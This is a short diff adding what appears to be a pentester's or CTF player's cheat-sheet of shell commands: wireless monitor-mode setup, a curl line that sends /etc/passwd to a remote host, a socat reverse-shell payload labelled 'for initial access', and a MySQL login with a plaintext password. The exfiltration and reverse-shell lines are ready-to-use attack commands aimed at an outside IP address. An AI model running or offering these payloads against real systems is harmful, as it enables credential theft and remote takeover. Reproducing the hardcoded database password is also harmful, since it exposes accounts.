@@ -1,0 +1,19 @@
+# WLAN show config:
+iwconfig
+iw dev wlan2 link
+ip link show wlan2
+
+# Enable Monitor mode (promiscuous mode) on wlan interface and set the channel:
+sudo ip link set wlan3 down
+sudo iw dev wlan3 set type monitor
+sudo ip link set wlan3 up
+sudo iw dev wlan3 set channel 6
+
+# Read file:
+/bin/bash -c \"curl --data-binary @/etc/passwd http://10.13.37.182:4567/passwd\"
+
+# Reverse shell payload for initial access:
+"/bin/bash -c \"socat tcp:10.13.37.182:4445 exec:/bin/sh\""
+
+# Connect local mysql:
+mysql -h127.0.0.1 -ucraftuser -p'CraftDB_pw_2026' craft
